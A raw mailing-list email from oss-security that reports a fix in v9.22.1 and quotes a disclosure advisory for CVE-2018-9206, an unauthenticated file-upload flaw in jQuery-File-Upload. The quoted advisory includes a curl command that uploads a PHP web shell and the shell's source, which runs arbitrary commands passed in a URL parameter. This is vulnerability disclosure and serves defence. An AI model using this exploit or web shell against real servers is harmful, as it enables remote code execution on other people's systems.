X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1763" "Saturday" "13" "October" "2018" "22:11:41" "-0400" "Larry W. Cashdollar" "larry0@me.com" "<270DF5EF-8FE1-486A-B15B-BC117769E4D8@me.com>" "56" "Re: [oss-security] jQuery-File-Upload <= v9.22.0 unauthenticated arbitrary file upload vulnerability" nil nil nil "10" "2018101402:11:41" "[oss-security] jQuery-File-Upload <= v9.22.0 unauthenticated arbitrary file upload vulnerability" (number mark "U       larry0@me.co Oct 13   56/1763  " thread-indent "\"Re: [oss-security] jQuery-File-Upload <= v9.22.0 unauthenticated arbitrary file upload vulnerability\"\n") "<70dba524-20af-4af3-9c45-698d762e1a4a@me.com>" ("<70dba524-20af-4af3-9c45-698d762e1a4a@me.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 26174 invoked by uid 550); 14 Oct 2018 02:11:57 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 26154 invoked from network); 14 Oct 2018 02:11:56 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=me.com; s=04042017;
	t=1539483103; bh=6RKlHCoKjlM7o8GnR+jcck5Sv1D6sw6BfO9k7U5dkhU=;
	h=Date:Subject:From:To:Message-id:MIME-version:Content-type;
	b=WcgEP7vrGlpPW0Yb/ctocxEayORrDO9gFMGm9/T/7Cgr9oRd5nRq0nqEzwjFRy3m2
 C50ddNenbgvFQPUsL6UfNowDLTFHqjE5+xKp43jijtRoqM5MnjrJ9CamZ03FQxxLaL
 B7yDBO9iKzB/lWWyprYO+YVW5Skt6MjwmXb183R8N5NreoLVY+Tg7QhE9uzL8N6qsO
 75qrOQa+phzSsQxcZbFpb2Z/XJq+VP5K/5B2xeRtJdZVmTvFF7IrgCHEjBPu/TqaOU
 /wpUSjhUAkO6CRNvR0HcfGos0Yffayvz0iYK/LLB6TKSkA4A0ff8izXCzmh4wu1OyT
 fVrK2yqKNNyAQ==
X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 suspectscore=0
 malwarescore=0 phishscore=0 bulkscore=0 spamscore=0 clxscore=1015 mlxscore=0
 mlxlogscore=879 adultscore=0 classifier=spam adjust=0 reason=mlx scancount=1
 engine=8.0.1-1807170000 definitions=main-1810140018
X-Proofpoint-Virus-Version: vendor=fsecure engine=2.50.10434:,,
 definitions=2018-10-14_02:,, signatures=0
User-Agent: Microsoft-MacOutlook/10.11.0.180909
Date: Sat, 13 Oct 2018 22:11:41 -0400
From: "Larry W. Cashdollar" <larry0@me.com>
To: Open Security <oss-security@lists.openwall.com>
Message-id: <270DF5EF-8FE1-486A-B15B-BC117769E4D8@me.com>
Thread-topic: [oss-security] jQuery-File-Upload <= v9.22.0 unauthenticated
 arbitrary file upload vulnerability
References: <70dba524-20af-4af3-9c45-698d762e1a4a@me.com>
In-reply-to: <70dba524-20af-4af3-9c45-698d762e1a4a@me.com>
MIME-version: 1.0
Content-type: multipart/alternative; boundary=B_3622313503_1974825838
Subject: Re: [oss-security] jQuery-File-Upload <= v9.22.0 unauthenticated
 arbitrary file upload vulnerability

--B_3622313503_1974825838
Content-type: text/plain;
	charset="UTF-8"
Content-transfer-encoding: 7bit

Hello All,

 

This has been fixed in v9.22.1.

 

Larry

From: "Larry W. Cashdollar" <larry0@me.com>
Reply-To: Open Security <oss-security@lists.openwall.com>
Date: Thursday, October 11, 2018 at 12:07 PM
To: Open Security <oss-security@lists.openwall.com>
Subject: [oss-security] jQuery-File-Upload <= v9.22.0 unauthenticated arbitrary file upload vulnerability

 

Title: jQuery-File-Upload <= v9.22.0 unauthenticated arbitrary file upload vulnerability
Author: Larry W. Cashdollar, @_larry0
Date: 2018-10-09
CVE-ID:[CVE-2018-9206]
Download Site: https://github.com/blueimp/jQuery-File-Upload/
Vendor: https://github.com/blueimp
Vendor Notified: 2018-10-09
Vendor Contact:
Advisory: http://www.vapidlabs.com/advisory.php?v=204
Description: File Upload widget with multiple file selection, drag&drop support, progress bar, validation and preview images, audio and video for jQuery. Supports cross-domain, chunked and resumable file uploads. Works with any server-side platform (Google App Engine, PHP, Python, Ruby on Rails, Java, etc.) that supports standard HTML form file uploads.
Vulnerability:
The code in https://github.com/blueimp/jQuery-File-Upload/blob/master/server/php/UploadHandler.php doesn't require any validation to upload files to the server. It also doesn't exclude file types. This allows for remote code execution.


Exploit Code:
$ curl -F "files=@shell.php" http://localhost/jQuery-File-Upload-9.22.0/server/php/index.php

Where shell.php is:

<?php 

$cmd=$_GET['cmd']; 

system($cmd);

?>
Screen Shots:
Notes: Actively being exploited in the wild. https://github.com/blueimp/jQuery-File-Upload/pull/3514


--B_3622313503_1974825838--


